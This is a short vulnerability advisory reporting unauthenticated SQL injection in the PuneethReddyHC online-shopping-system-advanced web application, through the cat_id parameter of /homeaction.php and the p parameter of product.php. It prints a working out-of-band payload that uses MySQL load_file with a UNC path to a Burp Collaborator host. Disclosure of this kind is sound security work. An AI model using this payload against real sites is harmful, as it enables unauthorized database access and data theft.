## Description:
An un-authenticated SQL Injection exists in PuneethReddyHC online-shopping-system-advanced through the /homeaction.php cat_id parameter. 
Using a post request does not sanitize the user input, also the p parameter appears to be vulnerable to SQL injection attacks through the product.php
The payload (select load_file('\\\\r6ydk9nev8ihf512dmmuf0xgi7o1cx0o2ctzjn8.burpcollaborator.net\\zxy')) was submitted in the p parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
